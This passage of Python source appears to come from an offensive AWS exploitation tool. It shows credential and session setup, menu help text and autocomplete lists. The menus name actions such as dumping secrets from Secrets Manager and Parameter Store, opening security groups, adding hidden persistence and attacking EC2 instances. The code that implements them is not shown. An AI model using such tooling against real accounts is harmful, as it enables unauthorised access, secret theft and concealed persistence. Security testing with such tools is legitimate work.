                               aws_access_key_id=aws_access_key_id,
                               aws_secret_access_key=aws_secret_access_key,
                               caller=caller,
                               )

    if aws_session_token == '':
        mysession = boto3.session.Session(aws_access_key_id=aws_access_key_id,
                                          aws_secret_access_key=aws_secret_access_key,
                                          region_name=chosen_region)
    else:
        mysession = boto3.session.Session(aws_access_key_id=aws_access_key_id,
                                          aws_secret_access_key=aws_secret_access_key,
                                          region_name=chosen_region, aws_session_token=aws_session_token)
    ec2client = mysession.client('ec2')
    possible_regions = convert_regions(raw_regions=ec2client.describe_regions()['Regions'])
    my_aws_creds = {'aws_access_key_id': aws_access_key_id, 'aws_secret_access_key': aws_secret_access_key,
                    'region_name': chosen_region, 'aws_session_token': aws_session_token, 'session': mysession,
                    'possible_regions': possible_regions}
    # menu_stack.append(caller)
    # handle_menu()
    go_to_menu(caller)  # menu_backward()


def set_aws_creds_inline(aws_access_key_id: T_ACCESS_KEY_ID,
                         aws_secret_access_key: T_SECRET_KEY,
                         region_name: T_REGION_NAME | None,
                         aws_session_token: T_TOKEN):
    """
    Set AWS credentials to the target account from the command line arguments directly, no prompts.
    :param aws_access_key_id: access key id
    :param aws_secret_access_key: access secret key
    :param region_name: region name
    :param aws_session_token: token, if any
    :return: None
    """
    global my_aws_creds

    if aws_session_token == '':
        mysession = boto3.session.Session(
            aws_access_key_id=aws_access_key_id, aws_secret_access_key=aws_secret_access_key, region_name=region_name)
    else:
        mysession = boto3.session.Session(aws_access_key_id=aws_access_key_id,
                                          aws_secret_access_key=aws_secret_access_key,
                                          region_name=region_name, aws_session_token=aws_session_token)

    regionresponse = ''
    try:
        ec2client = mysession.client('ec2')
        regionresponse = ec2client.describe_regions()
    except Exception as e:
        if "OptInRequired" in str(e):
            print_color("[!] OptInRequired Error: The keys are valid but you have a problem in your AWS account."
                        "Your account may be under validation by AWS. Is it a new account?")
        else:
            print_color(
                "[!] Error accessing AWS services. Double check your AWS keys, tokens, privileges and region.")
        exit()
    regions = regionresponse['Regions']
    possible_regions = []
    for region in regions:
        possible_regions.append(region['RegionName'])
    if region_name not in possible_regions:
        print_color("[!] Invalid AWS region! Exiting....")
        exit()
    if aws_session_token == '':
        mysession = boto3.session.Session(
            aws_access_key_id=aws_access_key_id, aws_secret_access_key=aws_secret_access_key,
            region_name=region_name)
    else:
        mysession = boto3.session.Session(aws_access_key_id=aws_access_key_id,
                                          aws_secret_access_key=aws_secret_access_key,
                                          region_name=region_name, aws_session_token=aws_session_token)
    my_aws_creds = {'aws_access_key_id': aws_access_key_id, 'aws_secret_access_key': aws_secret_access_key,
                    'region_name': region_name, 'aws_session_token': aws_session_token, 'session': mysession,
                    'possible_regions': possible_regions}


def show_aws_creds(caller):
    """
    List AWS credentials used to connect to this AWS account.
    :param caller: calling menu
    :return: None
    """
    global menu_stack
    global my_aws_creds
    if my_aws_creds == {}:
        print_color(
            '[!] You haven\'t set your AWS credentials yet. Run the command setprofile to set them')
        # menu_stack.append(caller)
        # handle_menu()
        go_to_menu(caller)
    try:
        print_color('[+] Your AWS credentials:')
        print_color('[*] access key id: %s' %
                    my_aws_creds['aws_access_key_id'])
        print_color('[*] secret access key: %s' %
                    my_aws_creds['aws_secret_access_key'])
        print_color('[*] session token: %s' %
                    my_aws_creds['aws_session_token'])
        print_color('[*] region: %s' % my_aws_creds['region_name'])
    except:
        print_color(
            '[!] You haven\'t set your AWS credentials yet. Run the command dumpsecrets to set them')
    # menu_stack.append(caller)
    # handle_menu()
    go_to_menu(caller)


def main_help():
    """
    Display Main Menu help options.
    :return: None
    """
    print(""" Main Help menu
            ================
            help            - print this menu
            where           - find where you are in the program
            back            - Go back to the previous menu
            exit            - Exit the program
            setprofile      - Set your AWS credentials
            showprofile     - Show your AWS credentials
            showsecrets     - Show credentials and secrets acquired from the target AWS account
            training        - Go to training mode            
            dumpsecrets     - Gather and dump credentials of EC2 in Secrets Manager and Parameter Store
            attacksurface   - Discover attack surface of target AWS account
            addtosecgroups  - Add IPs and ports to security groups
            persistence     - Add persistence and hide deeper
            ec2instances    - Go to EC2 instances menu
            securitygroups  - List all discovered Security Groups
            """)
    main_loop()


MAINCOMMANDS = ['help', 'where', 'back', 'exit', 'setprofile', 'showprofile', 'showsecrets',
                'training', 'dumpsecrets', 'attacksurface', 'addtosecgroups', 'persistence', 'ec2instances',
                'securitygroups']


def maincomplete(text, state):
    """
    Autocomplete for the main menu commands.
    """
    for cmd in MAINCOMMANDS:
        if cmd.startswith(text):
            if not state:
                return cmd
            else:
                state -= 1


def training_help():
    """
    Display command options for the training menu.
    :return: None
    """
    print(""" Training Help menu
            ================
            help        - print this menu
            where       - find where you are in the program
            back        - Go back to the previous menu
            exit        - Exit the program
            setprofile  - Set your AWS credentials
            showprofile - Show your AWS credentials
            start       - Start training mode

            """)
    training_loop()


TRAININGCOMMANDS = ['help', 'where', 'back',
                    'exit', 'setprofile', 'showprofile', 'start']


def trainingcomplete(text, state):
    """
    Autocomplete for training menu.
    """
    for cmd in TRAININGCOMMANDS:
        if cmd.startswith(text):
            if not state:
                return cmd
            else:
                state -= 1


def instances_help():
    """
    Display command options for the EC2 instances menu.
    :return:
    """
    print(""" EC2 instances Help menu
            ================
            help            - print this menu
            where           - find where you are in the program
            back            - Go back to the previous menu
            exit            - Exit the program
            setprofile      - Set your AWS credentials
            showprofile     - Show your AWS credentials
            showsecrets     - Show credentials and secrets acquired from the target AWS account
            ec2attacks      - Launch attacks against running EC2 instances
            list            - List all discovered EC2 instances
            dumpsecrets     - Gather and dump credentials of EC2 in Secrets Manager and Parameter Store
            attacksurface   - Discover attack surface of target AWS account
            securitygroups  - List all discovered Security Groups
            commandresults  - Check command results
            instance        - Get more details about an instance
            """)
    instances_loop()


INSTANCESCOMMANDS = ['help', 'where', 'back', 'exit', 'setprofile', 'showprofile', 'showsecrets',
                     'ec2attacks', 'dumpsecrets', 'attacksurface', 'list', 'commandresults', 'securitygroups',
                     'instance']


def instancecomplete(text, state):
    """
    Autocomplete for EC2 instances menu

    """
    for cmd in INSTANCESCOMMANDS:
        if cmd.startswith(text):
            if not state:
                return cmd
            else:
                state -= 1


start()
